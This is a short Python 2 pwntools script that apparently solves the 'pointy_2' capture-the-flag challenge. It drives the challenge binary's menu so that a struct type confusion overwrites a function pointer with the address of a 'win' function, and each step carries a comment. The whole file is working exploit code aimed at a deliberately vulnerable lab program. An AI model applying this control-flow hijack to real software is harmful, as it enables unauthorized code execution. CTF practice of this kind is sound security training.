from pwn import *


def start():
    global sh
    stdout = process.PTY
    stdin = process.PTY
    sh = process(argv=['/problems/pointy_2_030e643c8a0e842516b1c6a3ff826144/vuln'], stdin=stdin, stdout=stdout)

def _sendlineafter(term, inp):
    output = sh.recvuntil(term)
    print output
    print inp
    sh.sendline(inp)
    return output

win = 0x08048696

def test(guess):
    start()
    _sendlineafter("student\n", 'A') #Student name
    _sendlineafter("student \n", 'B') #Prof name
    #This professor struct can be loaded as a student since both students and prof are saved in ADDRESS
    _sendlineafter("score \n", 'A') #A does the scoring
    _sendlineafter("scored \n", 'B') #B takes the score
    _sendlineafter("score: \n", str(win)) #This score takes the same place in struct Prof as scoreProfessor in struct Student
    _sendlineafter("student\n", 'C') #Cannot use B here because it will overight scoreProfessor C chosen at random
    _sendlineafter("student \n", 'C') #Prof name
    _sendlineafter("score \n", 'B') #B the Professor does the scoring which means lastScore will no be interpreted as scoreProfessor
    _sendlineafter("scored \n", 'C') #C takes the score (doesn't matter)
    _sendlineafter("score: \n", '1') #score (doesn't matter and won't be writen)
    output = sh.recvuntil("Input") #Win should run now
    print output
    exit(0)

test(None)
#print payload1 + '\n' + payload2
#while not test(None)
